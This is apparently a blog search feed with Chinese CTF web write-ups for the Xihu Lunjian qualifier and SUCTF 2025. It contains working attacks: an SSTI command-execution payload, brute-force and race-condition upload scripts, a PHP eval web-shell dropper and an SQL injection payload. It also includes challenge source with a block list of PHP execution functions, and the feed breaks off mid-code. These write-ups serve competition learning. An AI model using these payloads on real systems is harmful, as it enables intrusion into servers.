<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>第八届西湖论剑初赛web全题解</title>
    <link href="/2025/01/18/xhlj8/"/>
    <url>/2025/01/18/xhlj8/</url>
    
    <content type="html"><![CDATA[<h1 id="Rank-l"><a href="#Rank-l" class="headerlink" title="Rank-l"></a>Rank-l</h1><p><img src="/img/xhlj8/18ed26dd-7b79-422f-90e0-a0885dd3d9f4.png" alt="18ed26dd-7b79-422f-90e0-a0885dd3d9f4"><img src="/img/xhlj8/e823f730-9bc5-44d9-a2b9-a03b075a640c.png" alt="e823f730-9bc5-44d9-a2b9-a03b075a640c"></p><p>可能是ssti，过滤了一些东西，如果触发过滤，输入密码的页面会直接302</p><p>过滤了空格，用<code>request.args.aaa</code>可以参数逃逸。</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">phone_number=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">url_for.__globals__</span>[&#x27;__builtins__&#x27;].__import__(<span class="hljs-name">&#x27;os&#x27;</span>).popen(<span class="hljs-name">request.args.aaa</span>).read()&#125;&#125;</span><br></code></pre></td></tr></table></figure><p>然后再cpass页面：?aaa&#x3D;ls &#x2F; -al</p><p><img src="/img/xhlj8/a4d93610-c7d2-4716-8708-ce29e2f2b3ac.png" alt="a4d93610-c7d2-4716-8708-ce29e2f2b3ac"></p><p>flag有权限读，但是cat无效，可能是把cat移除了，这里用tac读出来。<img src="/img/xhlj8/5e2c6c2e-87e5-4ab0-b532-7eda478c2b92.png" alt="5e2c6c2e-87e5-4ab0-b532-7eda478c2b92"></p><h1 id="Rank-U"><a href="#Rank-U" class="headerlink" title="Rank-U"></a>Rank-U</h1><p>首先是绕验证码的爆破弱口令，这里用requests库的session来爆破，就只需要识别一次验证码后面可以一直爆破。</p><p>登录的poc：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> re<br><br>yzm_url = <span class="hljs-string">&quot;http://139.155.126.78:26554/captcha.php&quot;</span><br>login_url = <span class="hljs-string">&quot;http://139.155.126.78:26554/&quot;</span><br><br>password_dict = <span class="hljs-string">&quot;密码字典路径&quot;</span><br>open_file = <span class="hljs-built_in">open</span>(password_dict, <span class="hljs-string">&quot;r&quot;</span>, encoding=<span class="hljs-string">&quot;utf-8&quot;</span>)  <span class="hljs-comment">#拿到密码字典的所有密码</span><br>password = open_file.readlines()<br><br>sess = requests.session()   <span class="hljs-comment">#利用session，只需要保存一次密码</span><br>img = sess.get(yzm_url)<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;1.jpg&quot;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> f:  <span class="hljs-comment"># 先访问一次url，把验证码图片保存下来。</span><br>    f.write(img.content)<br>    f.close()<br><br>os.system(<span class="hljs-string">rf&#x27;&quot;C:\Program Files\Tesseract-OCR\tesseract.exe&quot; 1.jpg test&#x27;</span>)  <span class="hljs-comment"># 识别验证码，结果保存到本地</span><br>answer = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;test.txt&quot;</span>, <span class="hljs-string">&#x27;r&#x27;</span>).read()<br>true_answer = answer.replace(<span class="hljs-string">&quot; &quot;</span>, <span class="hljs-string">&quot;&quot;</span>).replace(<span class="hljs-string">&quot;\n&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)  <span class="hljs-comment"># 去掉换行和空格</span><br><span class="hljs-comment"># print(true_answer)</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(password)):  <span class="hljs-comment">#爆破密码</span><br>    p = password[i].replace(<span class="hljs-string">&quot;\n&quot;</span>,<span class="hljs-string">&quot;&quot;</span>)<br>    data = &#123;<br>        <span class="hljs-string">&quot;username&quot;</span>: <span class="hljs-string">&quot;admin&quot;</span>,<br>        <span class="hljs-string">&quot;password&quot;</span>: p,<br>        <span class="hljs-string">&quot;yzm&quot;</span>: true_answer<br>    &#125;<br>    res = sess.post(login_url,data=data)       <span class="hljs-comment">#发登录包</span><br>    s = re.findall(<span class="hljs-string">&quot;&lt;p class=&#x27;error&#x27;&gt;(.*)&lt;/p&gt;&quot;</span>,res.text)<br>    <span class="hljs-built_in">print</span>(p)<br>    <span class="hljs-keyword">if</span> s[<span class="hljs-number">0</span>] != <span class="hljs-string">&quot;用户名或密码错误，请重试!&quot;</span>:<br>        <span class="hljs-built_in">print</span>(res.text)<br>        <span class="hljs-built_in">print</span>(res.headers)<br></code></pre></td></tr></table></figure><p>爆出来密码是：year2000</p><p>登录进去直接能上传文件，但是好像访问不到，可能是条件竞争？</p><p><img src="/img/xhlj8/20120e94-78bd-4e84-8d73-5ea84882e1ce.png" alt="20120e94-78bd-4e84-8d73-5ea84882e1ce"></p><p>只有图片才能被成功上传。</p><p>经过测试发现确实是条件竞争，时间极短，需要很多的线程发包才行，这样又容易造成服务器卡顿，而且文件名是根据时间戳生成的某个字符串，这个题恶心就在这几个点。<img src="/img/xhlj8/ac6f2add-59a4-4535-a894-ef7d86bc12d5.png" alt="ac6f2add-59a4-4535-a894-ef7d86bc12d5"></p><p>python多线程发包，发请求，并匹配文件名：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> threading<br><br>url = <span class="hljs-string">&quot;http://139.155.126.78:27319&quot;</span><br><br>cookies = &#123;<span class="hljs-string">&quot;PHPSESSID&quot;</span>:<span class="hljs-string">&quot;p2j0ol7prsslt2mk8fss4bme2u&quot;</span>&#125;<br>file_path = <span class="hljs-string">r&quot;C:\Users\13664\Desktop\123.php&quot;</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(file_path, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    files = &#123;<br>        <span class="hljs-string">&#x27;file_upload&#x27;</span>: (file_path, f.read(), <span class="hljs-string">&#x27;application/octet-stream&#x27;</span>),<br>        <span class="hljs-string">&#x27;filename&#x27;</span>: (<span class="hljs-string">&#x27;filename&#x27;</span>, <span class="hljs-string">&#x27;123.php&#x27;</span>)<br>    &#125;<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">threads</span>():<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        res = requests.post(url+<span class="hljs-string">&quot;/admin/index.php&quot;</span>, cookies=cookies,files=files)<br>        <span class="hljs-comment">#print(res.text)</span><br>        s = re.findall(<span class="hljs-string">&quot;&lt;p class=\&quot;success\&quot;&gt;文件上传成功！文件已保存为: (.*)&lt;/p&gt;&quot;</span>,res.text)<br>        file_url = url + <span class="hljs-string">&quot;/admin&quot;</span>+s[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>:]<br>        res = requests.get(file_url,cookies=cookies)<br>        <span class="hljs-keyword">if</span> res.status_code == <span class="hljs-number">200</span>:<br>            <span class="hljs-built_in">print</span>(res.text)<br>            <span class="hljs-keyword">break</span><br><br><span class="hljs-comment"># 启动 100 个线程</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">100</span>):<br>    threading.Thread(target=threads).start()<br></code></pre></td></tr></table></figure><p>php文件：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-number">123</span>;<br><span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>)&#123;<br>    <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&quot;evil.php&quot;</span>,<span class="hljs-string">&quot;&lt;?php eval(\$_GET[123]);?&gt;&quot;</span>);<br>    &#125;;<br></code></pre></td></tr></table></figure><p>为了rce，上传这个php之后访问一次，会生成shell文件，方便rce。</p><p><img src="/img/xhlj8/f70625ce-f9d2-4ef1-9121-9391e307ea83.png" alt="f70625ce-f9d2-4ef1-9121-9391e307ea83"></p><p>经过几个小时尝试，才在最后拿到了这个shell文件。然后还ban掉了system和phpinfo等函数，我一度以为我的shell有问题。后面用<code>readfile(&#39;/flag&#39;);</code>来读取flag。</p><p><img src="/img/xhlj8/7b915e00-f765-434f-a4f2-d458eef15d31.png" alt="7b915e00-f765-434f-a4f2-d458eef15d31"></p><h1 id="sqli-or-not"><a href="#sqli-or-not" class="headerlink" title="sqli or not"></a>sqli or not</h1><p>过滤逗号，单双引号和双斜杠。</p><p>逗号的绕过方式，在上次极客大挑战的某个题中遇到过一次。</p><p><img src="/img/xhlj8/18d48619-0edb-4045-8a09-89141b2b53b3.png" alt="18d48619-0edb-4045-8a09-89141b2b53b3"></p><p>这样可以绕逗号</p><blockquote><p>info&#x3D;{“username”:”asd”&amp;info&#x3D;”password”:”132”}</p></blockquote><p>单引号绕过的点主要是这句</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">sql = sql.<span class="hljs-title function_">replace</span>(<span class="hljs-string">&quot;&#123;username&#125;&quot;</span>,username);<br></code></pre></td></tr></table></figure><p><a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/RegExp/leftContext">https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/RegExp/leftContext</a></p><p>The <code>RegExp.leftContext</code> static accessor property returns the substring preceding the most recent match. <code>RegExp[&quot;$</code>“]&#96; is an alias for this property.</p><p>静态访问器属性”RegExp.leftContext”返回最近匹配项之前的子字符串。”RegExp[“$&#96;”]”是该属性的别名。</p><p>这里的$`就是<code>&#123;username&#125;</code>前面的所有东西，也就是<code>select * from userinfo where username = &#39;</code></p><p>payload：info&#x3D;{“username”:”$&#96;or 1&#x3D;1%23”&amp;info&#x3D;”password”:”132”}</p><p>经过拼接后：select * from userinfo where username &#x3D; ‘select * from userinfo where username &#x3D; ‘or 1&#x3D;1#’ and password &#x3D; ‘132’</p><p>这样就取到了单引号了。</p><p><img src="/img/xhlj8/c46535d2-c9f4-46d5-b5cf-7cee8f3aedf8.png" alt="c46535d2-c9f4-46d5-b5cf-7cee8f3aedf8"></p>]]></content>
    
    
    <categories>
      
      <category>WPs</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WPs</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SUCTF 2025 WEB部分wp</title>
    <link href="/2025/01/14/SUCTF2025/"/>
    <url>/2025/01/14/SUCTF2025/</url>
    
    <content type="html"><![CDATA[<h1 id="SU-photogallery"><a href="#SU-photogallery" class="headerlink" title="SU_photogallery"></a>SU_photogallery</h1><p><img src="/img/SUCTF2025/7a0df70c-e9e2-4063-a71f-6483bc322897.png" alt="7a0df70c-e9e2-4063-a71f-6483bc322897"></p><p>尝试源码泄露 <a href="https://www.cnblogs.com/Kawakaze777/p/17799235.html![e0dcf5e1-a150-4c37-bd6e-bf45ea40a99b](img/SUCTF2025/e0dcf5e1-a150-4c37-bd6e-bf45ea40a99b.png)">https://www.cnblogs.com/Kawakaze777/p/17799235.html![e0dcf5e1-a150-4c37-bd6e-bf45ea40a99b](img/SUCTF2025/e0dcf5e1-a150-4c37-bd6e-bf45ea40a99b.png)</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_extension</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span></span>)</span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">pathinfo</span>(<span class="hljs-variable">$filename</span>, PATHINFO_EXTENSION);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check_extension</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span>,<span class="hljs-variable">$path</span></span>)</span>&#123;<br>    <span class="hljs-variable">$filePath</span> = <span class="hljs-variable">$path</span> . DIRECTORY_SEPARATOR . <span class="hljs-variable">$filename</span>;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_file</span>(<span class="hljs-variable">$filePath</span>)) &#123;<br>        <span class="hljs-variable">$extension</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-title function_ invoke__">get_extension</span>(<span class="hljs-variable">$filename</span>));<br><br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$extension</span>, [<span class="hljs-string">&#x27;jpg&#x27;</span>, <span class="hljs-string">&#x27;jpeg&#x27;</span>, <span class="hljs-string">&#x27;png&#x27;</span>, <span class="hljs-string">&#x27;gif&#x27;</span>])) &#123;<br>            <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$filePath</span>)) &#123;<br>                <span class="hljs-comment">// echo &quot;Fail to delete file: $filename\n&quot;;</span><br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>                &#125;<br>            <span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-comment">// echo &quot;This file format is not supported:$extension\n&quot;;</span><br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>                &#125;<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-comment">// echo &quot;nofile&quot;;</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">file_rename</span> (<span class="hljs-params"><span class="hljs-variable">$path</span>,<span class="hljs-variable">$file</span></span>)</span>&#123;<br>    <span class="hljs-variable">$randomName</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-title function_ invoke__">uniqid</span>().<span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">0</span>, <span class="hljs-number">99999</span>)) . <span class="hljs-string">&#x27;.&#x27;</span> . <span class="hljs-title function_ invoke__">get_extension</span>(<span class="hljs-variable">$file</span>);<br>                <span class="hljs-variable">$oldPath</span> = <span class="hljs-variable">$path</span> . DIRECTORY_SEPARATOR . <span class="hljs-variable">$file</span>;<br>                <span class="hljs-variable">$newPath</span> = <span class="hljs-variable">$path</span> . DIRECTORY_SEPARATOR . <span class="hljs-variable">$randomName</span>;<br><br>                <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">rename</span>(<span class="hljs-variable">$oldPath</span>, <span class="hljs-variable">$newPath</span>)) &#123;<br>                    <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$path</span> . DIRECTORY_SEPARATOR . <span class="hljs-variable">$file</span>);<br>                    <span class="hljs-comment">// echo &quot;Fail to rename file: $file\n&quot;;</span><br>                    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>                &#125;<br>                <span class="hljs-keyword">else</span>&#123;<br>                    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>                &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">move_file</span>(<span class="hljs-params"><span class="hljs-variable">$path</span>,<span class="hljs-variable">$basePath</span></span>)</span>&#123;<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-title function_ invoke__">glob</span>(<span class="hljs-variable">$path</span> . DIRECTORY_SEPARATOR . <span class="hljs-string">&#x27;*&#x27;</span>) <span class="hljs-keyword">as</span> <span class="hljs-variable">$file</span>) &#123;<br>        <span class="hljs-variable">$destination</span> = <span class="hljs-variable">$basePath</span> . DIRECTORY_SEPARATOR . <span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$file</span>);<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">rename</span>(<span class="hljs-variable">$file</span>, <span class="hljs-variable">$destination</span>))&#123;<br>            <span class="hljs-comment">// echo &quot;Fail to rename file: $file\n&quot;;</span><br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check_base</span>(<span class="hljs-params"><span class="hljs-variable">$fileContent</span></span>)</span>&#123;<br>    <span class="hljs-variable">$keywords</span> = [<span class="hljs-string">&#x27;eval&#x27;</span>, <span class="hljs-string">&#x27;base64&#x27;</span>, <span class="hljs-string">&#x27;shell_exec&#x27;</span>, <span class="hljs-string">&#x27;system&#x27;</span>, <span class="hljs-string">&#x27;passthru&#x27;</span>, <span class="hljs-string">&#x27;assert&#x27;</span>, <span class="hljs-string">&#x27;flag&#x27;</span>, <span class="hljs-string">&#x27;exec&#x27;</span>, <span class="hljs-string">&#x27;phar&#x27;</span>, <span class="hljs-string">&#x27;xml&#x27;</span>, <span class="hljs-string">&#x27;DOCTYPE&#x27;</span>, <span class="hljs-string">&#x27;iconv&#x27;</span>, <span class="hljs-string">&#x27;zip&#x27;</span>, <span class="hljs-string">&#x27;file&#x27;</span>, <span class="hljs-string">&#x27;chr&#x27;</span>, <span class="hljs-string">&#x27;hex2bin&#x27;</span>, <span class="hljs-string">&#x27;dir&#x27;</span>, <span class="hljs-string">&#x27;function&#x27;</span>, <span class="hljs-string">&#x27;pcntl_exec&#x27;</span>, <span class="hljs-string">&#x27;array&#x27;</span>, <span class="hljs-string">&#x27;include&#x27;</span>, <span class="hljs-string">&#x27;require&#x27;</span>, <span class="hljs-string">&#x27;call_user_func&#x27;</span>, <span class="hljs-string">&#x27;getallheaders&#x27;</span>, <span class="hljs-string">&#x27;get_defined_vars&#x27;</span>,<span class="hljs-string">&#x27;info&#x27;</span>];<br>    <span class="hljs-variable">$base64_keywords</span> = [];<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$keywords</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$keyword</span>) &#123;<br>        <span class="hljs-variable">$base64_keywords</span>[] = <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$keyword</span>);<br>    &#125;<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$base64_keywords</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$base64_keyword</span>) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$fileContent</span>, <span class="hljs-variable">$base64_keyword</span>)!== <span class="hljs-literal">false</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br><br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>           <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br><br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check_content</span>(<span class="hljs-params"><span class="hljs-variable">$zip</span></span>)</span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$zip</span>-&gt;numFiles; <span class="hljs-variable">$i</span>++) &#123;<br>        <span class="hljs-variable">$fileInfo</span> = <span class="hljs-variable">$zip</span>-&gt;<span class="hljs-title function_ invoke__">statIndex</span>(<span class="hljs-variable">$i</span>);<br>        <span class="hljs-variable">$fileName</span> = <span class="hljs-variable">$fileInfo</span>[<span class="hljs-string">&#x27;name&#x27;</span>];<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/\.\.(\/|\.|%2e%2e%2f)/i&#x27;</span>, <span class="hljs-variable">$fileName</span>)) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>; <br>        &#125;<br>            <span class="hljs-comment">// echo &quot;Checking file: $fileName\n&quot;;</span><br>            <span class="hljs-variable">$fileContent</span> = <span class="hljs-variable">$zip</span>-&gt;<span class="hljs-title function_ invoke__">getFromName</span>(<span class="hljs-variable">$fileName</span>);<br>            <br><br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/(eval|base64|shell_exec|system|passthru|assert|flag|exec|phar|xml|DOCTYPE|iconv|zip|file|chr|hex2bin|dir|function|pcntl_exec|array|include|require|call_user_func|getallheaders|get_defined_vars|info)/i&#x27;</span>, <span class="hljs-variable">$fileContent</span>) || <span class="hljs-title function_ invoke__">check_base</span>(<span class="hljs-variable">$fileContent</span>)) &#123;<br>                <span class="hljs-comment">// echo &quot;Don&#x27;t hack me!\n&quot;;                return false;</span><br>            &#125;<br>            <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-keyword">continue</span>;<br>            &#125;<br>        &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">unzip</span>(<span class="hljs-params"><span class="hljs-variable">$zipname</span>, <span class="hljs-variable">$basePath</span></span>) </span>&#123;<br>    <span class="hljs-variable">$zip</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ZipArchive</span>;<br><br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$zipname</span>)) &#123;<br>        <span class="hljs-comment">// echo &quot;Zip file does not exist&quot;;</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;zip_not_found&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$zip</span>-&gt;<span class="hljs-title function_ invoke__">open</span>(<span class="hljs-variable">$zipname</span>)) &#123;<br>        <span class="hljs-comment">// echo &quot;Fail to open zip file&quot;;</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;zip_open_failed&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">check_content</span>(<span class="hljs-variable">$zip</span>)) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;malicious_content_detected&quot;</span>;<br>    &#125;<br>    <span class="hljs-variable">$randomDir</span> = <span class="hljs-string">&#x27;tmp_&#x27;</span>.<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-title function_ invoke__">uniqid</span>().<span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">0</span>, <span class="hljs-number">99999</span>));<br>    <span class="hljs-variable">$path</span> = <span class="hljs-variable">$basePath</span> . DIRECTORY_SEPARATOR . <span class="hljs-variable">$randomDir</span>;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$path</span>, <span class="hljs-number">0777</span>, <span class="hljs-literal">true</span>)) &#123;<br>        <span class="hljs-comment">// echo &quot;Fail to create directory&quot;;</span><br>        <span class="hljs-variable">$zip</span>-&gt;<span class="hljs-title function_ invoke__">close</span>();<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;mkdir_failed&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$zip</span>-&gt;<span class="hljs-title function_ invoke__">extractTo</span>(<span class="hljs-variable">$path</span>)) &#123;<br>        <span class="hljs-comment">// echo &quot;Fail to extract zip file&quot;;</span><br>        <span class="hljs-variable">$zip</span>-&gt;<span class="hljs-title function_ invoke__">close</span>();<br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$zip</span>-&gt;numFiles; <span class="hljs-variable">$i</span>++) &#123;<br>        <span class="hljs-variable">$fileInfo</span> = <span class="hljs-variable">$zip</span>-&gt;<span class="hljs-title function_ invoke__">statIndex</span>(<span class="hljs-variable">$i</span>);<br>        <span class="hljs-variable">$fileName</span> = <span class="hljs-variable">$fileInfo</span>[<span class="hljs-string">&#x27;name&#x27;</span>];<br>        <span 